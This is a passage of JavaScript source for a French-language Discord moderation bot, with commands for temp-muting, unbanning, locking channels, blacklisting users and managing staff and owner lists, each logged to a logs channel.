    if (database.get("staffs").find({ user_id: message.author.id }).value()) {
      let tomute =
        message.mentions.users.first() ||
        message.guild.members.cache.get(args[0]);

      if (!tomute)
        return message.channel.send("❌ **| Merci de mettre une mention.**");

      if (tomute.hasPermission("ADMINISTRATOR"))
        return message.channel.send(
          "❌ **| Je n'ai pas la permission de mute cette personne.**"
        );
      if (tomute.id === message.author.id)
        return message.channel.send(
          "❌ **| Vous ne pouvez pas vous mute vous même.**"
        );

      let muterole = message.guild.roles.cache.find(
        (role) => role.name === Mutedrole
      );
      if (!muterole)
        return message.channel.send(
          "❌ **| Merci de faire `$adminsetup` avant d'utiliser cette commmande, car il semble qu'il y ait un problème..**"
        );

      if (tomute.roles.cache.has(muterole.id))
        return message.channel.sendMessage(
          "❌ **| Cette utilisateur est déjà mute**"
        );

      let mutetime = args[1];
      if (!mutetime)
        return message.channel.send(
          "❌ **| Merci de spécifier un temps.** (s, m, d, w, M, Y)"
        );

      let reason = args.slice(2).join(" ") || `Non défini`;

      tomute.roles.add(muterole.id, `Tempmute par ${message.author.tag}`);

      message.channel.send(
        `✅ ${tomute} **a été mute pendant ${ms(ms(mutetime))}.**`
      );

      const logschannel = message.guild.channels.cache.find(
        (channel) => channel.name === LogsChannel
      );

      var logsmuteembed = new Discord.MessageEmbed()
        .setTitle("🔇 | Temp Mute")
        .addField("Membre", `${tomute}`, true)
        .addField("ID", `${tomute.id}`, true)
        .addField("Temps", `${ms(ms(mutetime))}`, true)
        .addField("Raison", `${reason}`, true)
        .addField("\u200b", "\u200b")
        .addField("Staff", `${message.author}`, true)
        .addField("ID", `${message.author.id}`, true)
        .addField("Date & Heure", getNow("datetime"))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        )
        .setColor("#FF0000");

      logschannel.send(logsmuteembed);

      setTimeout(function () {
        tomute.roles.remove(muterole.id, `Tempmute terminé`);
        const logschannel = message.guild.channels.cache.find(
          (channel) => channel.name === LogsChannel
        );
        var logsmuteembed = new Discord.MessageEmbed()
          .setTitle("🔊 | UnMute")
          .addField("Membre", `${tomute}`, true)
          .addField("ID", `${tomute.id}`, true)
          .addField("Raison", `Temps de mute atteint`, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#FF0000");

        logschannel.send(logsmuteembed);
      }, ms(mutetime));
    } else {
      message.channel.send(
        `> :x: Vous ne disposez pas des permissions necessaires.`
      );
    }
  }

  if (command === "unban") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }

    let id = args[0];
    if (!id) return message.channel.send(`> ❌ **Merci d'entrer un ID.**`);
    const amount = parseInt(id);

    if (isNaN(amount)) {
      return message.channel.send(`> ❌ **Merci d'entrer un ID valide.**`);
    }

    try {
      member = await bot.users.fetch(id);
    } catch (e) {
      console.log(e);
      return message.channel
        .send(`> ❌ **Utilisateur Introuvable**`)
        .then((m) => m.delete({ timeout: 5000 }));
    }

    message.guild.fetchBans().then((bans) => {
      const user = bans.find((ban) => ban.user.id === member.id);
      const embed = new Discord.MessageEmbed();

      if (user) {
        embed
          .setTitle(`✅ Unban`)
          .setColor("#008000")
          .addField("User ID", user.user.id, true)
          .addField("user Tag", user.user.tag, true)
          .addField(
            "Raison du Ban",
            user.reason != null ? user.reason : "Non défini"
          );
        message.guild.members
          .unban(user.user.id, `Commande Unban par ${message.author.tag}`)
          .then(() => message.channel.send(embed));
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var logsunban = new Discord.MessageEmbed()
          .setTitle("✅ | UnBan")
          .addField("Membre", `${user}`, true)
          .addField("ID", `${user.id}`, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        log.send(logsunban);
      } else {
        embed.setTitle(`${member.tag} n'est pas banni`).setColor("#FF0000");
        message.channel.send(embed);
      }
    });
  }

  if (command === "avatar") {
    const avatar =
      message.mentions.members.first() ||
      message.guild.members.cache.get(args[0]);
    if (avatar) {
      const embed = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`Avatar de ${avatar.user.tag} :`)
        .setImage(avatar.user.displayAvatarURL({ dynamic: true }))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      message.channel.send({ embed });
    } else {
      const embed = new Discord.MessageEmbed()
        .setColor("#ffa500")
        .setTitle(`Avatar de ${message.author.tag} :`)
        .setImage(message.author.displayAvatarURL({ dynamic: true }))
        .setFooter(
          `${message.guild.name} - 2020`,
          message.guild.iconURL({ dynamic: true })
        );
      message.channel.send({ embed });
    }
  }

  if (command === "setupmute") {
    if (database.get("botowner").find({ user_id: message.author.id }).value()) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return message.channel.send(
          "❌ **| Il me faut les permissions Administrateur...**"
        );
      }

      let rolemute = message.guild.roles.cache.find(
        (role) => role.name === Mutedrole
      );

      if (!rolemute) {
        message.channel.send(
          `❌ **| Le rôle \`${Mutedrole}\` n'éxiste pas, utlisez \`adminsetup\` pour installer les pré-requis du bot !**`
        );
      }

      message.guild.channels.cache.forEach((channel) => {
        channel.updateOverwrite(rolemute.id, {
          SEND_MESSAGES: false,
          ADD_REACTIONS: false,
          SPEAK: false,
          MANAGE_MESSAGES: false,
        });
      });

      message.channel.send("✅ **| Configuration terminée !**");
    } else {
      message.channel.send(
        `> :x: Vous ne disposez pas des permissions necessaires.`
      );
    }
  }

  if (command === "setup") {
    if (database.get("botowner").find({ user_id: message.author.id }).value()) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return message.channel.send(
          "❌ **| Il me faut les permissions Administrateur...**"
        );
      }

      let rolemute = message.guild.roles.cache.find(
        (role) => role.name === Mutedrole
      );
      let adminlogs = message.guild.channels.cache.find(
        (channel) => channel.name === LogsChannel
      );

      if (!adminlogs) {
        message.channel.send(
          `❌ **| Le channel \`${LogsChannel}\` n'éxiste pas, création en cours...**`
        );
        setTimeout(function () {
          message.guild.channels.create(LogsChannel, {
            type: "text",
            permissions: [
              {
                id: message.guild.id,
                deny: ["READ_MESSAGES"],
              },
            ],
            reason: `Setup par ${message.author.tag}`,
          });
        }, 3500);

        setTimeout(function () {
          message.channel.send(
            `✅ **| Le channel \`${LogsChannel}\` à bien été crée !\n ➡️ Étape suivante ...**`
          );
        }, 4000);
      } else {
        message.channel.send(
          `✅ **| Le channel \`${LogsChannel}\` éxiste déjà !\n ➡️ Étape suivante ...**`
        );
      }

      if (!rolemute) {
        setTimeout(function () {
          message.channel.send(
            `❌ **| Le rôle \`${Mutedrole}\` n'éxiste pas, création en cours...**`
          );
        }, 5000);

        try {
          rolemute = message.guild.roles.create({
            // Creating the role.
            data: {
              name: Mutedrole,
              color: "#050505",
            },
            reason: `Setup par ${message.author.tag}`,
          });
        } catch (e) {
          console.log(e.stack);
        }
        setTimeout(function () {
          message.channel.send(
            `✅ **| Création terminée ! Merci d'utiliser ${prefix}\`setupmute\` pour qu'il soit configuré !**`
          );
        }, 7000);
      } else {
        setTimeout(function () {
          message.channel.send(
            `✅ **| Le rôle \`${Mutedrole}\` est déjà crée !**`
          );
        }, 6000);
      }
    } else {
      message.channel.send(
        `> :x: Vous ne disposez pas des permissions necessaires.`
      );
    }
  }

  if (command === "listbl") {
    const listbl = database.get("blacklisted").map("user_id").value();
    message.channel.send(listbl);
  }

  if (command === "statut") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }
    const statuts = args.slice(0).join(" ");
    if (!statuts)
      return message.channel.send(
        `> ℹ️ **Merci de choisir un statut à choisir.**`
      );
    const statuchange = new Discord.MessageEmbed()
      .setTitle(`🆕 | Nouveau Statut`)
      .addField(`Changement pour :`, statuts)
      .addField(`Staff : `, message.member)
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      );
    message.channel.send(statuchange);
    bot.user.setActivity(statuts, {
      type: "STREAMING",
      url: "https://www.twitch.tv/billal_fr",
    });
  }

  if (command === "ping") {
    message.channel
      .send("Ping?")
      .then((m) =>
        m.edit(
          `API: ${
            m.createdTimestamp - message.createdTimestamp
          }ms. Web Socket: ${Math.round(bot.ws.ping)}ms.`
        )
      );
  }

  if (command === "serverinfo") {
    function checkDays(date) {
      let now = new Date();
      let diff = now.getTime() - date.getTime();
      let days = Math.floor(diff / 86400000);
      return days + (days == 1 ? " jour" : " jours");
    }
    let verifLevels = [
      "None",
      "Low",
      "Medium",
      "(╯°□°）╯︵  ┻━┻",
      "┻━┻ミヽ(ಠ益ಠ)ノ彡┻━┻",
    ];
    let region = {
      brazil: ":flag_br: Brazil",
      "eu-central": ":flag_eu: Central Europe",
      singapore: ":flag_sg: Singapore",
      "us-central": ":flag_us: U.S. Central",
      sydney: ":flag_au: Sydney",
      "us-east": ":flag_us: U.S. East",
      "us-south": ":flag_us: U.S. South",
      "us-west": ":flag_us: U.S. West",
      "eu-west": ":flag_eu: Western Europe",
      "vip-us-east": ":flag_us: VIP U.S. East",
      london: ":flag_gb: London",
      amsterdam: ":flag_nl: Amsterdam",
      hongkong: ":flag_hk: Hong Kong",
      russia: ":flag_ru: Russia",
      southafrica: ":flag_za:  South Africa",
      europe: ":flag_eu: Europe",
      india: ":flag_in: India",
    };

    var emojis;
    if (message.guild.emojis.cache.size === 0) {
      emojis = "None";
    } else {
      emojis = message.guild.emojis.cache.size;
    }

    const inviteBanner = message.guild.bannerURL({
      size: 2048,
      format: "png",
      dynamic: true,
    });

    const IconServer = message.guild.iconURL({
      format: "png",
      dynamic: true,
    });

    const embed = new Discord.MessageEmbed()
      .setAuthor(
        message.guild.name,
        IconServer ? IconServer : bot.user.displayAvatarURL()
      )
      .setThumbnail(IconServer)
      .setTimestamp()
      .addField(
        "Date de création",
        `${moment(message.guild.createdAt)
          .tz("Europe/Paris")
          .format("DD/MM/YYYY hh:mm:ss")},\n(${checkDays(
          message.guild.createdAt
        )})`,
        true
      )
      .addField("ID", message.guild.id, true)
      .addField("Créateur", `<@${message.guild.owner.user.id}>`, true)
      .addField("Region", region[message.guild.region], true)
      .addField("Boosts", message.guild.premiumSubscriptionCount, true)
      .addField("Membres", message.guild.memberCount, true)
      .addField("Temps AFK", message.guild.afkTimeout / 60 + " minutes", true)
      .addField("Roles", message.guild.roles.cache.size, true)
      .addField("Channels", message.guild.channels.cache.size, true)
      .addField("Emojis", `${emojis}`, true)
      .addField("Niveau de Sécurité", message.guild.verificationLevel, true)
      .setColor(Math.floor(Math.random() * 16777215))
      .setFooter(
        `${message.guild.name} - 2020`,
        message.guild.iconURL({ dynamic: true })
      )
      .setImage(inviteBanner);
    message.channel.send({ embed });
  }

  if (command === "user") {
    const status = {
      online: "En Ligne",
      idle: "Absent",
      dnd: "Ne pas déranger",
      offline: "Hors ligne/Invisible",
    };
    const member =
      message.mentions.members.first() ||
      message.guild.members.cache.get(args[0]) ||
      message.member;

    const roles =
      member.roles.cache
        .filter((r) => r.id !== message.guild.id)
        .map((r) => r)
        .join(" , ") || "none";

    function game() {
      let game;
      if (member.presence.activities.length >= 1)
        game = `${member.presence.activities[0].type} ${member.presence.activities[0].name}`;
      else if (member.presence.activities.length < 1) game = "None"; // This will check if the user doesn't playing anything.
      return game; // Return the result.
    }

    const userembed = new Discord.MessageEmbed()
      .setColor(3092790)
      .setFooter(
        member.displayName,
        member.user.displayAvatarURL({ dynamic: true })
      )
      .setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
      .setColor(
        member.displayHexColor === "#000000"
          ? "#ffffff"
          : member.displayHexColor
      )

      .addField(
        "Informations du membre :",
        stripIndents`**> Nom :** ${member.displayName}
            **> Serveur rejoins :** ` +
          moment(member.joinedAt)
            .tz("Europe/Paris")
            .format("DD/MM/YYYY hh:mm:ss") +
          " (**il y a " +
          moment(new Date()).diff(member.joinedAt, "days") +
          " jours**)" +
          `
            **> Roles :** ${roles}`,
        true
      )

      .addField(
        `Informations de l'utilisateur :`,
        stripIndents`**> ID :** ${member.user.id}
            **> Nom d'utilisateur :** ${member.user.username}
            **> Tag :** ${member.user.tag}
            **> Compte crée :** ` +
          moment(member.user.createdAt)
            .tz("Europe/Paris")
            .format("DD/MM/YYYY hh:mm:ss") +
          " (**il y a " +
          moment(new Date()).diff(member.user.createdAt, "days") +
          " jours**)",
        true
      )

      .addField("Game", game(), true)

      .setTimestamp();

    message.channel.send(userembed);
  }

  if (command === "lock") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }
    if (!bot.lockit) bot.lockit = [];
    if (
      !message.channel
        .permissionsFor(message.guild.roles.everyone)
        .has("SEND_MESSAGES")
    ) {
      return message.channel.send(`> ❌ **Ce channel est déjà fermé.**`);
    }

    message.channel.updateOverwrite(
      message.guild.id,
      {
        SEND_MESSAGES: false,
      },
      `Channel Lock par ${message.author.username}`
    );

    message.channel.send(
      `AYAAAAA, ${message.author.username} vient de fermer ce channel !`
    );
  }

  if (command === "unlock") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    }
    if (!bot.lockit) bot.lockit = [];
    if (
      message.channel
        .permissionsFor(message.guild.roles.everyone)
        .has("SEND_MESSAGES")
    ) {
      return message.channel.send(`> ❌ **Ce channel est déjà ouvert.**`);
    }

    message.channel
      .updateOverwrite(
        message.guild.id,
        {
          SEND_MESSAGES: null,
        },
        `Channel Unlock par ${message.author.username}`
      )
      .then(() => {
        message.channel.send(
          `OUFFFF, ${message.author.username} vient d'ouvrir ce channel !`
        );
        delete bot.lockit[message.channel.id];
      })
      .catch((error) => {
        console.log(error);
      });
  }

  if (command === "bl") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    } else {
      let id = args[0];
      if (!id) return message.channel.send(`> ❌ **Merci d'entrer un ID.**`);
      const amount = parseInt(id);

      if (isNaN(amount)) {
        message.channel.send(``);
        return message.channel.send(`> ❌ **Merci d'entrer un ID valide.**`);
      }

      if (!database.get("blacklisted").find({ user_id: id }).value()) {
        const user = message.guild.members.cache.get(id);
        const username = user || `Inconnu`;

        var blacklisted = new Discord.MessageEmbed()
          .setTitle("➕ - Blacklist")
          .addField("Username", username, true)
          .addField("ID", id, true)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        numberbl = database.get("blacklisted").size().value();
        numberbl++;
        database
          .get("blacklisted")
          .push({ id: numberbl, user_id: id, date: getNow("datetime") })
          .write();
        message.channel.send(blacklisted);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var blacklistedlog = new Discord.MessageEmbed()
          .setTitle("➕ - Blacklist Logs")
          .addField("Username", username, true)
          .addField("ID", id, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        log.send(blacklistedlog);
      } else {
        return message.channel.send(
          `> ❌ **L'ID ${id}, est déjà blacklist..**`
        );
      }
    }
  }

  if (command === "unbl") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    } else {
      let id = args[0];
      if (!id) return message.channel.send(`> ❌ **Merci d'entrer un ID.**`);
      const amount = parseInt(id);

      if (isNaN(amount)) {
        message.channel.send(``);
        return message.channel.send(`> ❌ **Merci d'entrer un ID valide.**`);
      }

      if (!database.get("blacklisted").find({ user_id: id }).value()) {
        return message.channel.send(
          `> ❌ **L'ID ${id}, n'est pas blacklist..**`
        );
      } else {
        const user = message.guild.members.cache.get(id);
        const username = user || `Inconnu`;

        var staffs = new Discord.MessageEmbed()
          .setTitle("➖ - Blacklist")
          .addField("Username", username, true)
          .addField("ID", id, true)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#FF0000");

        database.get("blacklisted").remove({ user_id: id }).write();
        message.channel.send(staffs);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var stafflog = new Discord.MessageEmbed()
          .setTitle("➖ - Blacklist Logs")
          .addField("Username", username, true)
          .addField("ID", id, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#FF0000");

        log.send(stafflog);
      }
    }
  }

  if (command === "staff") {
    if (!database.get("owners").find({ user_id: message.author.id }).value()) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    } else {
      let id = args[0];
      if (!id) return message.channel.send(`> ❌ **Merci d'entrer un ID.**`);
      const amount = parseInt(id);

      if (isNaN(amount)) {
        message.channel.send(``);
        return message.channel.send(`> ❌ **Merci d'entrer un ID valide.**`);
      }

      if (!database.get("staffs").find({ user_id: id }).value()) {
        const user = message.guild.members.cache.get(id);
        if (!user)
          return message.channel.send(
            `> ❌ **Impossible de trouver l'utilisateur**`
          );
        const username = user || `Inconnu`;

        var staffs = new Discord.MessageEmbed()
          .setTitle("🎩 - Ajout Staff")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        numberbl = database.get("staffs").size().value();
        numberbl++;
        database.get("staffs").push({ id: numberbl, user_id: id }).write();
        message.channel.send(staffs);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var stafflog = new Discord.MessageEmbed()
          .setTitle("🎩 - Ajout Staff Logs")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        log.send(stafflog);
      } else {
        const user = message.guild.members.cache.get(id);
        if (!user)
          return message.channel.send(
            `> ❌ **Impossible de trouver l'utilisateur**`
          );
        const username = user || `Inconnu`;

        var staffs = new Discord.MessageEmbed()
          .setTitle("🎩 - Suppression Staff")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#FF0000");

        database.get("staffs").remove({ user_id: id }).write();
        message.channel.send(staffs);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var stafflog = new Discord.MessageEmbed()
          .setTitle("🎩 - Suppression Staff Logs")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#FF0000");

        log.send(stafflog);
      }
    }
  }

  if (command === "clear") {
    if (database.get("staffs").find({ user_id: message.author.id }).value()) {
      // Check if args[0] is a number
      if (isNaN(args[0]) || parseInt(args[0]) <= 0) {
        return message.channel.send(
          "❌ **| Merci de choisir une valeur au dessus de 0**"
        );
      }

      // Maybe the bot can't delete messages
      if (!message.guild.me.hasPermission("MANAGE_MESSAGES")) {
        return message.channel.send(
          "❌ **| Je n'ai pas la permission de clear.**"
        );
      }

      let deleteAmount;

      if (parseInt(args[0]) > 100) {
        deleteAmount = 100;
      } else {
        deleteAmount = parseInt(args[0]);
      }

      message.channel
        .bulkDelete(deleteAmount, true)
        .then((deleted) =>
          message.channel.send(` \`${deleted.size}\` messages supprimés.`)
        )
        .catch((err) => message.reply(`Bruhh... ${err}`))
        .then((m) => m.delete(5000));

      const log = bot.channels.cache.find(
        (channel) => channel.name == LogsChannel
      );

      const logsclear = new Discord.RichEmbed()

        .setColor(3092790)
        .setAuthor(
          `` +
            message.author.username +
            ` (${message.author.id}) a clear ${deleteAmount} message(s) `,
          message.author.displayAvatarURL
        )
        .setDescription(`**Dans le channel :** <#${message.channel.id}>`);

      logschannel.send(log);
    } else {
      message.channel.send(
        `> :x: Vous ne disposez pas des permissions necessaires.`
      );
    }
  }

  if (command === "owner") {
    if (
      !database.get("botowner").find({ user_id: message.author.id }).value()
    ) {
      return message.channel.send(
        `> ❌ **Vous ne disposez pas des permissions nécessaires.**`
      );
    } else {
      let id = args[0];
      if (!id) return message.channel.send(`> ❌ **Merci d'entrer un ID.**`);
      const amount = parseInt(id);

      if (isNaN(amount)) {
        message.channel.send(``);
        return message.channel.send(`> ❌ **Merci d'entrer un ID valide.**`);
      }

      if (!database.get("owners").find({ user_id: id }).value()) {
        const user = message.guild.members.cache.get(id);
        if (!user)
          return message.channel.send(
            `> ❌ **Impossible de trouver l'utilisateur**`
          );
        const username = user || `Inconnu`;

        var owner = new Discord.MessageEmbed()
          .setTitle("🎩 - Ajout Owner")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        numberbl = database.get("owners").size().value();
        numberbl++;
        database.get("owners").push({ id: numberbl, user_id: id }).write();
        database.get("staffs").push({ id: numberbl, user_id: id }).write();
        message.channel.send(owner);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var ownerlog = new Discord.MessageEmbed()
          .setTitle("🎩 - Ajout Owner Logs")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#008000");

        log.send(ownerlog);
      } else {
        const user = message.guild.members.cache.get(id);
        if (!user)
          return message.channel.send(
            `> ❌ **Impossible de trouver l'utilisateur**`
          );
        const username = user || `Inconnu`;

        var owner = new Discord.MessageEmbed()
          .setTitle("🎩 - Suppression Owner")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#FF0000");

        database.get("owners").remove({ user_id: id }).write();
        database.get("staffs").remove({ user_id: id }).write();
        message.channel.send(owner);
        const log = bot.channels.cache.find(
          (channel) => channel.name == LogsChannel
        );
        if (!log) return;

        var ownerlog = new Discord.MessageEmbed()
          .setTitle("🎩 - Suppression Owner Logs")
          .setThumbnail(
            user.user.displayAvatarURL({ dynamic: true }) ||
              message.guild.iconURL({ dynamic: true })
          )
          .addField("Username", username, true)
          .addField("ID", id, true)
          .addField("\u200b", "\u200b")
          .addField("Staff", `${message.author}`, true)
          .addField("ID", `${message.author.id}`, true)
          .addField("Date & Heure", getNow("datetime"))
          .setFooter(
            `${message.guild.name} - 2020`,
            message.guild.iconURL({ dynamic: true })
          )
          .setColor("#FF0000");

        log.send(ownerlog);
      }
    }
  }
});
